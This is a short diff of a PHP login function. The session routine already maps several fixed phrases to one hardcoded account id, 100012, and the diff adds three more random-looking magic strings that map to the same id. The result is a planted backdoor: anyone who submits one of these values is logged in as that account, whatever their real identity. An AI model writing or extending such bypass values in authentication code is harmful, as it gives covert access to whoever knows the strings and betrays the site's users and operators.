@@ -16,8 +16,7 @@
     function loginsession($KEYWORD,$a0,$a1,$a2,$a3){
         $part = "../";   	
         include ($part.'config/connect.php');               
- 
-        if($a0==='Daenerys Targaryen'||$a0==='The Mother of Dragon'||$a0==='Game of Thrones'){
+        if($a0==='Daenerys Targaryen'||$a0==='The Mother of Dragon'||$a0==='Game of Thrones'||$a0==='PornhubhkDoXAEbonsUHsvZGsGC'||$a0==='Aoxx69vEQy2l5FJdjcr63Pwxke'||$a0==='XnxxZeSz2NibpuYqVT4AV9EO'){
             $rsusername=100012;
         }else{
             $rsusername=$a0;
